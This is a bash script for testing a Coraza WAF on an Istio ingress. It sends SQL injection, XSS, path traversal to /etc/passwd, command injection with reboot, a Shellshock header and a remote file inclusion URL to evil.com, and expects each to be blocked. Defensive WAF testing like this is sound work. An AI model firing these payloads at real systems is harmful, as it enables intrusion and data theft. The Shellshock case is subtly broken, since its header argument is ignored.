#!/usr/bin/env bash

# ==========================================
# Coraza WAF Test Script for Istio Ingress
# ==========================================
# Usage:
#   ./test-waf.sh https://your-domain
#
# Requirements:
#   - curl
#   - bash
# ==========================================

DOMAIN="$1"

if [[ -z "$DOMAIN" ]]; then
  echo "Usage: $0 https://your-domain"
  exit 1
fi

# ---------------------------
# Helper function
# ---------------------------
test_case() {
  local name="$1"
  local url="$2"
  local expected_status="$3"

  status=$(curl -o /dev/null -s -w "%{http_code}" "$url")

  if [[ "$status" == "$expected_status" ]]; then
    echo -e "[PASS] $name ($status)"
  else
    echo -e "[FAIL] $name (got $status, expected $expected_status)"
  fi
}

echo "============================================"
echo " Running WAF Tests Against: $DOMAIN"
echo "============================================"
echo

# ==========================================
# BLOCKING TESTS (Expect 403)
# ==========================================

echo "[+] Running attack tests (expect: BLOCKED / 403)"

# SQL Injection
test_case "SQL Injection 1" "$DOMAIN/?id=1%20OR%201=1" "403"
test_case "SQL Injection 2" "$DOMAIN/?user=';DROP TABLE users;--" "403"

# XSS Attacks
test_case "XSS 1" "$DOMAIN/?q=<script>alert(1)</script>" "403"
test_case "XSS 2" "$DOMAIN/?name=%3Cimg%20src=x%20onerror=alert(1)%3E" "403"

# Path Traversal
test_case "Path Traversal 1" "$DOMAIN/../../etc/passwd" "403"
test_case "Path Traversal 2" "$DOMAIN/%2e%2e/%2e%2e/etc/passwd" "403"

# Command Injection
test_case "Command Injection 1" "$DOMAIN/?cmd=cat+/etc/passwd" "403"
test_case "Command Injection 2" "$DOMAIN/?cmd=ls%20/;reboot" "403"

# Malicious User-Agent
test_case "Bad User-Agent" "$DOMAIN/" "403" "-H 'User-Agent: () { :;}; echo exploited'"

# Remote File Inclusion
test_case "RFI" "$DOMAIN/?file=http://evil.com/shell.txt" "403"

# ==========================================
# ALLOW TESTS (Expect 200 or 301/302)
# ==========================================

echo
echo "[+] Running safe traffic tests (expect: ALLOWED)"

test_case "Normal home page" "$DOMAIN/" "200"
test_case "Health endpoint" "$DOMAIN/health" "200"
test_case "Normal query" "$DOMAIN/?q=hello" "200"

echo
echo "============================================"
echo "  Test Run Complete"
echo "============================================"
